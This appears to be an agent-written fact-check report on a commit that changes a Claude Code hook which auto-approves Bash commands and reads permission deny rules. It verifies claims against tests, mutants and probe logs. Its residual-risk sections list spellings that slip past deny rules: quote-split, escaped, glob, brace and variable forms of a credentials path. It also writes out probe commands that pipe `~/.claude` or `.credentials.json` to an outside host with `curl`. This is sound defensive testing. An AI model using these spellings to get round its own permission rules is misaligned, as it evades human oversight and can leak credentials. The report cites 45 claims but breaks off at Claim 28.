Commit: 5ba83a3a

# Code Fact-Check Report

**Repository:** claude-workflows, worktree `/home/node/.claude/jobs/00bcf178/tmp/q092/wt-u1` (branch `fix/q092a-drop-deny-option`)
**Scope:** Full unit, Q-092 unit 1: `git diff 00a27a2f..5ba83a3a -- ':(exclude)docs/reviews'` (hook, test file, plan) plus the commit messages `git log 00a27a2f..5ba83a3a`. Unit 2 (`/workspace/.claude/wt-q092`, HEAD 73698a91) was read wherever a unit-1 claim points at it.
**Checked:** 2026-10-15
**Commit:** 5ba83a3a
**Replication:** k=3 (final confirming pass, no `--loop-pass`)
**Total claims checked:** 45
**Summary:** 40 verified, 1 mostly accurate, 2 stale, 1 incorrect, 1 unverifiable

Hallucination-pattern log read (`docs/reviews/hallucination-patterns.md`). No claim below matches a logged pattern, and no claim here is a fabrication.

Pass-1/2 findings already accepted in the rubric are not filed again: C1 (false/null permission lists count as absent in unit 1) and C8 (b973e678 credits F3's plan changes to the wrong review). The preamble's known residuals (F3/F4 rely on Claude Code's matcher) are also not filed again.

**Execution provenance (applies to every `executed` claim).** All runs were made from `/home/node/.claude/jobs/00bcf178/tmp/q092/agents/code-fact-check-report-q092a-final-r2/` (called `$A` below) against the worktree, each under `timeout`. All exited 0. Output files are in `$A/logs/`:
- `cd wt-u1 && timeout 600 bats test/auto-approve-allowed-commands.bats` at 2026-10-15T12:25:09Z, exit 0, 43/43 ok. Log: `logs/bats-full.txt`
- `timeout 120 bash ./residuals.sh <hook> residuals.txt` at 12:26:21Z, exit 0. Log: `logs/residuals.txt`. The same script run on the hook as of 00a27a2f (`... 00a27a2f`) at 12:30:02Z, exit 0. Log: `logs/residuals-at-00a27a2f.txt`
- `timeout 600 bash ./mutants.sh ../../wt-u1 mutants.txt` at 12:26:59Z, exit 0: 17 mutants, all killed, baselines green. Log: `logs/mutants.txt`. Before the run counted, three mutants were spot-checked with `bash -n` and a diff, and one was confirmed to really print `"ask"`.
- `timeout 300 bash ./extglob.sh ../../wt-u1 extglob.txt` at 12:31:16Z, exit 0. Log: `logs/extglob.txt`. The first attempt used a broken mutant (`[...|...]` inside `[[ ]]`) and was discarded; the log holds the corrected run.
- `timeout 120 bash ./ruletable.sh <hook> ruletable.txt` at 12:31:37Z, exit 0. Log: `logs/ruletable.txt`
- `timeout 120 bash ./f6probe.sh <U1 hook|U2 hook> f6-u1.txt|f6-u2.txt` at 12:32:46Z, exit 0. Logs: `logs/f6-u1.txt`, `logs/f6-u2.txt`
- `claude --version` printed `2.1.300 (Claude Code)`. `grep -c -a fullyUnquoted .../claude-code/bin/claude.exe` returned 2. Both ran at about 12:28Z and are recorded inline.
- `printf 'not json' | bash hooks/auto-approve-allowed-commands.sh; echo $?` returned 4, and `[1]` returned 5. Run at 12:27:30Z, recorded inline.

Every probe that writes settings uses a fresh `mktemp -d` under `$A` and a fake `HOME`, and removes it afterwards. No processes were left running; `ps` was checked before writing this report.

---

## Claim 1: "Branch: `fix/q092-drop-hook-deny-reader` (from `merge/ready-2026-10-15`, 00a27a2f)"

**Location:** `docs/working/plan-q092-drop-hook-deny-reader.md:3`
**Type:** Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers that 00a27a2f is a merge into `merge/ready-2026-10-15` and is contained in both Q-092 branches. It does not establish that this is the branch's current tip (merge/ready has since moved to 5e6e9266).

`git log --oneline -1 00a27a2f` gives `00a27a2f Merge branch 'chore/dev-cycle-2026-10-15-0357' into merge/ready-2026-10-15`. `git branch -a --contains 00a27a2f` lists `fix/q092-drop-hook-deny-reader`, `fix/q092a-drop-deny-option` and `merge/ready-2026-10-15`.

**Evidence:** `docs/working/plan-q092-drop-hook-deny-reader.md:3`

---

## Claim 2: "Q-082 (archive, answered 2026-09-28): under a PreToolUse hook that always returned `allow`, a Bash call matching `permissions.deny` was still denied, and the user confirmed `/hooks` listed the hook."

**Location:** `docs/working/plan-q092-drop-hook-deny-reader.md:7-9`
**Type:** Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers what the Q-082 archive entry records. It does not re-establish the host result itself.

The archive entry for Q-082 says: "`cat x.q082-canary` was **denied** … **Answer (2026-09-28):** the user confirmed `/hooks` listed the test hook. So a PreToolUse hook `allow` does **not** override a matching `permissions.deny` rule." The test hook it describes echoes `"permissionDecision":"allow"` for every call (`docs/working/questions-archive.md`, `### Q-082`).

**Evidence:** `docs/working/questions-archive.md` (`### Q-082`)

---

## Claim 3: "Decision log 53, amendment 2026-09-28, records this and files the removal as Q-092."

**Location:** `docs/working/plan-q092-drop-hook-deny-reader.md:10`
**Type:** Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers row 53's 2026-09-28 amendment text. It does not cover the later amendments to that row.

Row 53 reads: "**Amended 2026-09-28 (Q-082):** … A hook `allow` does not override deny, so the hook's deny reader is redundant for `allow`; its removal is Q-092." (`docs/decisions/log.md:76`)

**Evidence:** `docs/decisions/log.md:76`

---

## Claim 4: "Architecture review 2026-09-27, finding 1: the reader is a second, partial Bash-deny engine … (one known divergence already: `Bash(rm *)` vs bare `rm`). 'If deny wins, delete the deny reader and keep the hook allow-only.'"

**Location:** `docs/working/plan-q092-drop-hook-deny-reader.md:11-14`
**Type:** Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the quote and the paraphrase of finding 1. It does not cover findings 2 and 3.

`docs/reviews/architecture-review-2026-09-27.md:49` says: "- If deny wins, delete the deny reader and keep the hook allow-only." The finding body says "A known semantic divergence already exists (`Bash(rm *)` vs bare `rm`)" and "Enforcement, however, is now split between Claude Code's engine and a re-implementation inside the hook."

**Evidence:** `docs/reviews/architecture-review-2026-09-27.md:25-50`

---

## Claim 5: "the only stdout write in `main` is the `allow` JSON … `debug` writes to stderr only. `show_help` and `check_deps` (`exit 2`) run only under the `parse_commands` subcommand, which `wiring.json` never invokes. … (measured: malformed input JSON exits 4 …) … So no path emits `ask`, `deny` or `defer`"

**Location:** `docs/working/plan-q092-drop-hook-deny-reader.md:15-25`
**Type:** Behavioral / Invariant
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers every stdout write in `main` (signature to `exit 0`, lines 339-446), the dispatch at :944-952, and the wiring entry. It does not establish what Claude Code does with a non-zero, non-2 exit; the plan states that as an expectation, not something it measured.

The only stdout write is the allow JSON:

```bash
# hooks/auto-approve-allowed-commands.sh:438-443
  if $all_allowed; then
    debug "Decision: ALLOW (all commands passed)"
    echo '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow"}}'
  else
    debug "Decision: BLOCK (falling through to normal permission check)"
  fi
```

`debug` writes to stderr (`echo "[DEBUG] $*" >&2`, :126). `check_deps` exits 2 (:546) and is reached only from `parse_commands` (:927), which is dispatched only on `parse_commands)` (:945-947). The wiring command takes no arguments: `"command": "bash {{CLAUDE_DIR}}/hooks/auto-approve-allowed-commands.sh"` (`hooks/wiring.json:78`). Executed: `not json` exits 4, `{"tool_input":` exits 4, `[1]` exits 5. Each of the 8 "emit a decision on another path" mutants in `logs/mutants.txt` is killed by the stdout test.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:124-128`, `:339-446`, `:533-548`, `:898-952`, `hooks/wiring.json:78`, `logs/mutants.txt`

---

## Claim 6: "The hook is not in `live-verify-gate.sh`'s `enforcement`/`host_tools` regexes (it is payload under `claude-home/`, hashed by the manifest at install)"

**Location:** `docs/working/plan-q092-drop-hook-deny-reader.md:29-31`
**Type:** Configuration / Architectural
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers both regexes and the manifest's walk over `claude-home/`. It does not trace the install-time copy of `hooks/` into `claude-home/`.

`enforcement='^devcontainer-config/(Dockerfile|devcontainer\.json|init-firewall\.sh|cc-sni-proxy\.py|link-claude-home\.sh|cc-isolated\.sh|install\.sh$|egress/)'` and `host_tools='^devcontainer-config/(cc-exit-scan\.sh|cc-gitdir\.sh|cc-push\.sh)'` (`hooks/live-verify-gate.sh:83,91`). Both are anchored at `devcontainer-config/`. The manifest walks the payload: `if [ -d claude-home ]; then find claude-home \( -type f -o -type l \) | LC_ALL=C sort; fi` (`devcontainer-config/cc-isolated.sh:149`), described as "claude-home/ — the baked skills/hooks payload" (:122).

**Evidence:** `hooks/live-verify-gate.sh:83-93`, `devcontainer-config/cc-isolated.sh:122,149`

---

## Claim 7: F1 "hook allows; CC's deny wins (Q-082)" and F2 "no path emits `ask` … pinned by a new test"

**Location:** `docs/working/plan-q092-drop-hook-deny-reader.md:36-37`
**Type:** Reference / Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers F1's reliance on Q-082 (Claim 2) and F2's test. F1's "After" column describes the whole stack: in unit 1 the hook still falls through on the literal spelling (`logs/residuals.txt`, controls).

F2's test is `test/auto-approve-allowed-commands.bats:147` and passes (`logs/bats-full.txt`). It kills all 8 decision-emitting mutants (`logs/mutants.txt`).

**Evidence:** `test/auto-approve-allowed-commands.bats:147-170`, `logs/mutants.txt`, `logs/residuals.txt`

---

## Claim 8: F3 "`${X:-push}` is refused by the shape allowlist anyway | hook's de-quoted match fell through → prompt | hook allows … CC 2.1.300 builds `fullyUnquoted` forms of a command (seen in the binary)"

**Location:** `docs/working/plan-q092-drop-hook-deny-reader.md:38`
**Type:** Behavioral / Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the before and after behaviour of the four named spellings, the `${X:-push}` refusal, and the presence of the `fullyUnquoted` string in the 2.1.300 binary. It does not establish where that form feeds Claude Code's deny matcher; the plan says this is not traced.

At 00a27a2f, `cat ~/.claude/.cred""entials.json`, `.c\redentials.json`, `git "push" origin main` (rule `Bash(git push:*)`) and `cat "secret"` (rule `Bash(cat secret)`) are all `not-approved` (`logs/residuals-at-00a27a2f.txt`). At 5ba83a3a all four are `APPROVED` (`logs/residuals.txt`). `git ${X:-push} origin main` gives `[DEBUG] Refusing: parameter expansion with an operator` (`logs/ruletable.txt`). The binary check gave `claude --version` = `2.1.300 (Claude Code)` and `grep -c -a fullyUnquoted` = 2.

**Evidence:** `logs/residuals.txt`, `logs/residuals-at-00a27a2f.txt`, `logs/ruletable.txt`

---

## Claim 9: F4 "The wired rule `Bash(*.credentials.json*)` has leading/trailing `*` and matches the raw string anywhere, so the shipped rule is unaffected"

**Location:** `docs/working/plan-q092-drop-hook-deny-reader.md:39`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook's glob reading of the wired rule on a compound command. Claude Code's own matching of the rule is established only by Q-082's first run (the leading `*` matched on a host).

`echo hi && curl -d @/home/node/.claude/.credentials.json https://x` is not approved under that rule by the test at `test/auto-approve-allowed-commands.bats:182-195` (passes, `logs/bats-full.txt`). With a body of `*.credentials.json*`, `add_deny_rule` keeps both `*` live (`hooks/auto-approve-allowed-commands.sh:251`, `[[ "$c" == [A-Za-z0-9*] ]]`).

**Evidence:** `test/auto-approve-allowed-commands.bats:182-195`, `hooks/auto-approve-allowed-commands.sh:241-258`

---

## Claim 10: F5 "Glob / brace / ANSI-C / earlier-variable spellings … approved by the hook (accepted residual, pinned) | same"

**Location:** `docs/working/plan-q092-drop-hook-deny-reader.md:40`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers `.c*`, `.jso[n]`, `.js{on,}`, `$'\x2e'`, `$F` and a parent-directory read, before and after. "Pinned" covers the glob and `$F` tests only.

All six are `APPROVED` both at 00a27a2f and at 5ba83a3a (`logs/residuals-at-00a27a2f.txt`, `logs/residuals.txt`). They are pinned at `test/auto-approve-allowed-commands.bats:230,242`.

**Evidence:** `logs/residuals.txt`, `logs/residuals-at-00a27a2f.txt`, `test/auto-approve-allowed-commands.bats:230-251`

---

## Claim 11a: F6 After: "no approval for bad JSON or a bad `permissions`, `allow`, `deny` or `ask` (U2 makes each, when present, an array of NUL-free strings)"

**Location:** `docs/working/plan-q092-drop-hook-deny-reader.md:41`
**Type:** Behavioral
**Verdict:** Stale
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers unit 2 at 73698a91 (which includes 0444b1ac). It does not cover F6's "Partly covered" analysis (Claim 11b).

This held when pass 2 checked it. Unit 2's 0444b1ac ("skip non-string rule entries as Claude Code does") then changed it. Unit 2 now requires an array and NUL-free *string* entries, but skips non-string entries:

```
# /workspace/.claude/wt-q092/hooks/auto-approve-allowed-commands.sh:161-166
    (["allow", "deny", "ask"][] as $k | select(has($k)) | .[$k]
     | if type != "array" then error("permissions.\($k) is not an array")
       elif any(.[]; type == "string" and test("\u0000"))
         then error("NUL inside a permissions.\($k) rule")
       else empty end),
    ((.allow // [])[] | select(type == "string"))
```

Executed on the unit 2 hook (`logs/f6-u2.txt`): a global file of `{"permissions":{"deny":[1]}}`, `{"permissions":{"allow":[1]}}` or `{"permissions":{"ask":[1]}}` gives `APPROVED`. So the lists are not "arrays of NUL-free strings", and a "bad" `allow`/`deny`/`ask` holding a non-string still gets approval. Precise version: "U2 makes each, when present, an array whose string entries are NUL-free; non-string entries are skipped, as Claude Code drops them." Unit 1's own test still lists `{"permissions":{"deny":[1]}}` as a wrong shape (`test/auto-approve-allowed-commands.bats:294-295`); unit 2 replaces that test.

**Evidence:** `docs/working/plan-q092-drop-hook-deny-reader.md:41`, `/workspace/.claude/wt-q092/hooks/auto-approve-allowed-commands.sh:152-169`, `logs/f6-u2.txt`

---

## Claim 11b: F6 "Security review q092b: Claude Code 2.1.300 can ignore a whole settings file for an invalid value; … Residual, stated in the header" and F6b "no backstop"

**Location:** `docs/working/plan-q092-drop-hook-deny-reader.md:41-42`
**Type:** Reference
**Verdict:** Verified
**Confidence:** Medium
**Verification mode:** static
**Scope:** Covers that the unit 2 header states the residual and that the q092b security review exists. It does not re-establish Claude Code's file-dropping behaviour, which was read from the binary by the review and not run.

The unit 2 header says: "Claude Code can ignore a whole settings file for an invalid value … RESIDUAL: anything Claude Code rejects that this check accepts (another key's value, a BOM, jq-only literals such as NaN) can still make Claude Code drop the file, and its deny rules with it, while its allow rules approve here" (`/workspace/.claude/wt-q092/hooks/auto-approve-allowed-commands.sh:78-87`). `docs/reviews/security-review-q092b-2026-10-15.md` exists in unit 2.

**Evidence:** `/workspace/.claude/wt-q092/hooks/auto-approve-allowed-commands.sh:78-87`

---

## Claim 12: F7 "Relative or newline-bearing `CLAUDE_CONFIG_DIR` | no approval | no approval"

**Location:** `docs/working/plan-q092-drop-hook-deny-reader.md:43`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers unit 1 through its tests. Unit 2 keeps both checks (`read_settings_rules`, unit 2 :173 ff.).

`read_settings_rules` returns 1 on `"$CLAUDE_CONFIG_DIR" != /*` (:184-187) and on a newline in a path (:192-195). The tests at `test/auto-approve-allowed-commands.bats:334,346` pass.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:179-205`, `test/auto-approve-allowed-commands.bats:334-353`

---

## Claim 13: F8 "Another hook's `ask` (guard-trusted-writes, SOFT+tainted Bash) overriding a Bash deny"

**Location:** `docs/working/plan-q092-drop-hook-deny-reader.md:44`
**Type:** Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers that the guard emits `ask` on its SOFT-tier Bash path when tainted. It does not establish Claude Code's precedence for that `ask`.

`if tier == "soft" and tainted:` / `emit("ask", "This session fetched web content and this Bash command writes to a "` (`hooks/guard-trusted-writes.py:364-365`).

**Evidence:** `hooks/guard-trusted-writes.py:345-389`

---

## Claim 14: F10 "Q-082 did not record its version (Q-091, the same day, saw 2.1.284 on the host); the image installs `@latest` (2.1.300 here). Re-test trigger in the header."

**Location:** `docs/working/plan-q092-drop-hook-deny-reader.md:46`
**Type:** Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the Q-082 and Q-091 archive text, the local version, and the unit 2 header's trigger. It does not check the Dockerfile's install line.

Q-091 says: "it printed `2.1.284 (Claude Code)`". Q-082's entry names no version. Locally `claude --version` gives `2.1.300 (Claude Code)`. Unit 2's header says: "re-run Q-082's test when a Claude Code release changes how a PreToolUse permissionDecision combines with permission rules, or before relying on this after a major version" (`/workspace/.claude/wt-q092/hooks/auto-approve-allowed-commands.sh:56-59`).

**Evidence:** `docs/working/questions-archive.md` (`### Q-082`, `### Q-091`), `/workspace/.claude/wt-q092/hooks/auto-approve-allowed-commands.sh:55-59`

---

## Claim 15: "F5's glob spelling (`~/.claude/.c*`) already gets the same command approved, by the hook and by Claude Code's string matcher."

**Location:** `docs/working/plan-q092-drop-hook-deny-reader.md:48-51`
**Type:** Behavioral
**Verdict:** Unverifiable
**Confidence:** Medium
**Verification mode:** static
**Scope:** The hook half is verified (Claim 10). The Claude Code half is not: it would need a host run of `cat ~/.claude/.c*` under `Bash(*.credentials.json*)`.

The hook approves `cat ~/.claude/.c*` (`logs/residuals.txt`). That Claude Code's matcher also lets it through is plausible, since `.credentials.json` never appears in the text. But it was not run (paraphrased, no quote available because the claim concerns Claude Code's closed matcher, which this repo does not contain).

**Evidence:** `logs/residuals.txt`, `docs/working/plan-q092-drop-hook-deny-reader.md:48-51`

---

## Claim 16: Steps 1-3 (delete `--deny`, `CUSTOM_DENY*`, `DENY_GLOBS`, `add_deny_rule`, `PARAM_DEFAULT_RE`, `matches_deny`, `RULE_LEGACY`; with `--permissions` the settings files are no longer read; drop KNOWN DIVERGENCE; tests (a)/(b); docs in wiring.json, the guide, the link bats file, log 53)

**Location:** `docs/working/plan-q092-drop-hook-deny-reader.md:59-77`
**Type:** Architectural
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers whether unit 2 at 73698a91 carries out each step. "Rename `DENY_ALL`" became removal plus an early `return 0` (no allow rules), which keeps the stated effect.

`rg 'DENY_ALL|DENY_GLOBS|add_deny_rule|matches_deny|RULE_LEGACY|KNOWN DIVERGENCE|PARAM_DEFAULT|CUSTOM_DENY'` over the unit 2 hook finds nothing. Unit 2's `load_rules` reads settings only in the `else` branch of `if [[ -n "$CUSTOM_PERMISSIONS" ]]` (unit 2 :235-246). Executed: under `--permissions`, a settings-file `Bash(ls:*)` deny gives `APPROVED` on unit 2 and `not-approved` on unit 1 (`logs/f6-u2.txt`, `logs/f6-u1.txt`). Unit 2's test (b) is `deny rules in the settings files no longer change the hook's decision (Q-092)`. Unit 2's `git diff 00a27a2f..HEAD --stat` shows `guides/bare-host-hook-wiring.md`, `hooks/wiring.json`, `test/link-claude-home-wiring.bats` and `docs/decisions/log.md`.

**Evidence:** `/workspace/.claude/wt-q092/hooks/auto-approve-allowed-commands.sh:232-248`, `logs/f6-u1.txt`, `logs/f6-u2.txt`

---

## Claim 17a: "The whole change counts 652 code lines … U1 … ~365 lines. U2 … ~373 lines."

**Location:** `docs/working/plan-q092-drop-hook-deny-reader.md:81-88`
**Type:** Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the counts at the commits the plan was written against (1a831ffe, ed06dec1), using the brief's numstat formula.

The formula gives `00a27a2f..1a831ffe` = 365, `1a831ffe..ed06dec1` = 373 and `00a27a2f..ed06dec1` = 652 (run inline, 12:29Z).

**Evidence:** `git diff --numstat` per the brief, `docs/working/plan-q092-drop-hook-deny-reader.md:81-88`

---

## Claim 17b: "so it is two stacked units, each under 400"

**Location:** `docs/working/plan-q092-drop-hook-deny-reader.md:81-82`
**Type:** Configuration
**Verdict:** Stale
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the current sizes. It does not judge compliance, which the decision-62 amendment governs.

Both units have grown past 400 since the plan was written. Unit 1 `00a27a2f..5ba83a3a` = **407**. Unit 2 `5ba83a3a..73698a91` = **436**. The 2026-10-15 amendment to decision 62 tolerates "growth up to ~800 lines" inside the loop (`docs/decisions/log.md:85`), so this is not a cap breach. Only the plan's "each under 400" is out of date. b973e678's body already reports 403.

**Evidence:** `docs/decisions/log.md:85`, numstat counts above

---

## Claim 18: "`hooks/`, `test/` and `docs/` match neither gate regex, so no `Live-verified:` or `Host-tool-tested:` trailer is required (decision log 45, 71). Deploying … `install.sh` + re-bless."

**Location:** `docs/working/plan-q092-drop-hook-deny-reader.md:92-94`
**Type:** Configuration / Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the regexes (Claim 6) and that rows 45 and 71 define the two trailers. It does not run the deploy.

Row 45 describes "(e) `hooks/live-verify-gate.sh` … unless the message carries a `Live-verified:` trailer". Row 71 says "`live-verify-gate.sh` requires `Host-tool-tested:` for them instead of `Live-verified:`" (`docs/decisions/log.md:68,94`).

**Evidence:** `docs/decisions/log.md:68,94`, `hooks/live-verify-gate.sh:83-93`

---

## Claim 19: "--permissions JSON      Use custom allow rules instead of the settings files' allow lists"

**Location:** `hooks/auto-approve-allowed-commands.sh:15`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers non-empty `--permissions`. An empty-string value (`--permissions ''`) falls back to the settings allow lists, because the gate is `-z "$CUSTOM_PERMISSIONS"`; the help text does not mention this edge.

```bash
# hooks/auto-approve-allowed-commands.sh:273-287
  for rec in "${records[@]}"; do
    if [[ "$rec" == A$'\t'* && -z "$CUSTOM_PERMISSIONS" ]]; then
      add_allow_rule "${rec#A$'\t'}"
    elif [[ "$rec" == D$'\t'* ]]; then
      add_deny_rule "${rec#D$'\t'}"
    fi
  done

  if [[ -n "$CUSTOM_PERMISSIONS" ]]; then
    ...
    for rec in "${records[@]}"; do add_allow_rule "$rec"; done
  fi
```

The settings deny rules still apply under `--permissions` (`logs/f6-u1.txt`, last line: `not-approved (settings deny read)`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:265-288`, `logs/f6-u1.txt`

---

## Claim 20: ROLE: "A host test (Q-082, 2026-09-28) showed Claude Code still applies permissions.deny after a hook "allow" (a hook "ask" overrides it, Claude Code issue #39344, and this hook never asks), so the deny check below is redundant, and Q-092's second unit removes it."

**Location:** `hooks/auto-approve-allowed-commands.sh:57-60`
**Type:** Reference / Invariant
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers Q-082 (Claim 2), "never asks" (Claim 5) and unit 2's removal (Claim 16). #39344's content is taken from the repo's own records (decision log 53, the guard hook's comments) and was not fetched (no egress).

See Claims 2, 5 and 16.

**Evidence:** `docs/working/questions-archive.md` (`### Q-082`), `logs/mutants.txt`, `/workspace/.claude/wt-q092/hooks/auto-approve-allowed-commands.sh:232-248`

---

## Claim 21: WHAT THE DENY CHECK GUARANTEES: "never approves a command when a Bash deny rule matches the raw command or any extracted command. It FAILS CLOSED … permissions, permissions.allow or permissions.deny of the wrong shape"

**Location:** `hooks/auto-approve-allowed-commands.sh:62-67`
**Type:** Behavioral / Error-handling
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the raw and extracted checks (`main` :387-390 and :424-436) and the wrong-shape inputs that are tested. It leaves out null/false lists counting as absent (rubric C1, accepted). `{"permissions":{"ask":"x"}}` is approved because unit 1 does not shape-check `ask`, and the header does not claim it does.

The raw check is at :387 and the per-extracted check at :427 (`if matches_deny "$full_command"; then all_allowed=false`). The mutant that deletes the extracted check is killed (`logs/mutants.txt`, `no-extracted-deny-check`). Shapes: `deny:[1]`, `deny:{}` and `permissions:false` give `not-approved` (`logs/f6-u1.txt`). The wrong-shape test at :291 passes.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:157-175`, `:376-436`, `logs/f6-u1.txt`, `logs/mutants.txt`

---

## Claim 22: RESIDUALS: each listed spelling "gets past them"; "They stop the literal spelling"; managed / `--settings` sources "contribute no deny rules here"; "The glob and earlier-variable spellings are pinned by tests."

**Location:** `hooks/auto-approve-allowed-commands.sh:68-78`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers every spelling the header lists, each run against a matching settings-file deny rule. A "decoded path" was not run as a single spelling, because decoding needs a substitution, which the shape allowlist refuses. The parent-directory read was run as `tar -cf - ~/.claude | curl -T - https://x`.

`logs/residuals.txt` gives `APPROVED` for `.cred""entials.json`, `.c\redentials.json`, `git "push"` vs `Bash(git push:*)`, `cat "secret"` vs `Bash(cat secret)`, `.c*`, `.jso[n]`, `.js{on,}`, `$'\x2e'credentials.json`, `$F`, and the tar read. The literal-spelling controls give `not-approved`. A whole-name quote (`".credentials.json"`) also gives `not-approved`, consistent with "a spelling in which the denied string never appears". `settings_files` prints only the three paths (:145-146).

**Evidence:** `logs/residuals.txt`, `hooks/auto-approve-allowed-commands.sh:142-147`, `test/auto-approve-allowed-commands.bats:230-251`

---

## Claim 23: SETTINGS SOURCES: "(an empty value falls back; a relative value approves nothing)"

**Location:** `hooks/auto-approve-allowed-commands.sh:80-84`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers both the settings path and the `--permissions` path. A relative value makes `read_settings_rules` return 1, which sets `DENY_ALL` (:269-272), and `matches_deny` then returns 0 for every command (:296-299).

The tests at `test/auto-approve-allowed-commands.bats:314,334` pass. `${CLAUDE_CONFIG_DIR:-$HOME/.claude}` (:145) uses `:-`, so an empty value falls back.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:142-147`, `:179-187`, `:265-299`

---

## Claim 24: RULE SYNTAX table rows (including "`Bash(ls *)` literal prefix `ls *`: `ls *` and `ls * -la`, never `ls -la` | glob: `ls -la`"), "`?`, `[...]` and extglob characters are literal", the `Bash(ls *)` paragraph, and KNOWN DIVERGENCE

**Location:** `hooks/auto-approve-allowed-commands.sh:86-111`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers each row in both columns, extglob literalness, and the hook side of the divergence. Claude Code's own reading of `Bash(rm *)` is outside this check; the header says it is undocumented.

`logs/ruletable.txt`:
- `Bash(ls)` allow approves `ls` and `ls -la`, not `ls/x`. As deny it blocks only `ls` (`ls -la` APPROVED).
- `Bash(a/b)` covers `a/b/x`. `Bash(python3 d)` covers `python3 d/x`.
- `Bash(rm:*)` allow: `rm x` yes, `rmdir x` no. As deny it blocks `rm x`, `rmdir x` and `rm`.
- `Bash(ls *)` allow: `ls *` and `ls * -la` APPROVED, `ls -la` not. As deny it blocks `ls -la`.
- Bare `Bash` allow is ignored. `Bash`, `Bash(*)` and `Bash(**)` as deny block `ls -la`.
- `Bash(rm *)` as deny lets a bare `rm` through.

Extglob: with deny `Bash(cat @(a|b).txt)` and `Bash(cat +(x).md)`, the real hook approves `cat a.txt`, `cat x.md` and `cat xx.md`. A copy that leaves extglob characters live blocks all three (`logs/extglob.txt`).

**Evidence:** `logs/ruletable.txt`, `logs/extglob.txt`, `hooks/auto-approve-allowed-commands.sh:228-258`, `:314-337`

---

## Claim 25: "Only `*` is a wildcard; every other character is backslash-escaped … Without that, `?`, `[...]` and extglob characters in a rule were live glob syntax, and Bash(cat notes[1].txt) did not match the literal `cat notes[1].txt`."

**Location:** `hooks/auto-approve-allowed-commands.sh:236-240`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the whole of `add_deny_rule` (:241-258). The "without that" half is shown by mutants, not by the history.

```bash
# hooks/auto-approve-allowed-commands.sh:249-256
  for ((i = 0; i < ${#body}; i++)); do
    c=${body:i:1}
    if [[ "$c" == [A-Za-z0-9*] ]]; then
      glob+="$c"
    else
      glob+="\\$c"
    fi
  done
```

The no-escaping, brackets-live and `?`-live mutants are each killed (`logs/mutants.txt`). The extglob-live copy changes decisions (`logs/extglob.txt`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:241-258`, `logs/mutants.txt`, `logs/extglob.txt`

---

## Claim 26: "--permissions replaces the settings files' allow lists (testing); their deny lists are always read. The reader's status comes from `wait $!` …"

**Location:** `hooks/auto-approve-allowed-commands.sh:260-264`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers `load_rules` from :265 to :288. The bash < 4.4 sentence predates this unit and was not run.

`mapfile -d '' records < <(read_settings_rules)` runs unconditionally, followed by `if ! wait $!; then … DENY_ALL=true` (:268-272). Executed: a settings deny rule is honoured under `--permissions` (`logs/f6-u1.txt`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:265-288`, `logs/f6-u1.txt`

---

## Claim 27: "True when a deny rule matches the string … or when DENY_ALL is set. … add_deny_rule has already escaped everything but `*`, so `*` is the only live wildcard."

**Location:** `hooks/auto-approve-allowed-commands.sh:290-293`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers `matches_deny` from :294 to :309. No de-quoted form remains.

```bash
# hooks/auto-approve-allowed-commands.sh:296-308
  if $DENY_ALL; then
    debug "DENY: a deny source could not be read"
    return 0
  fi
  for glob in "${DENY_GLOBS[@]}"; do
    [[ -z "$glob" ]] && continue
    # shellcheck disable=SC2053
    if [[ "$str" == $glob ]]; then
      debug "DENY RULE: '$str' matches glob '$glob'"
      return 0
    fi
  done
  return 1
```

See Claim 25 for the escaping.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:294-309`

---

## Claim 28: Section comment: "A hook "allow" does not override permissions.deny (host test Q-082), and the hook never emits "ask" … The hook still reads settings-file deny rules; --deny and the de-quoted match are gone. … a construct the extraction filter did not descend into (decision log 53)."

**Location:** `test/auto-approve-allowed-commands.bats:114-119`
**Type:** Reference / Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers each sentence against Claims 2, 5, 21, 22 and row 53's text ("Four constructs the filter does not descend into … arithmetic expansion").

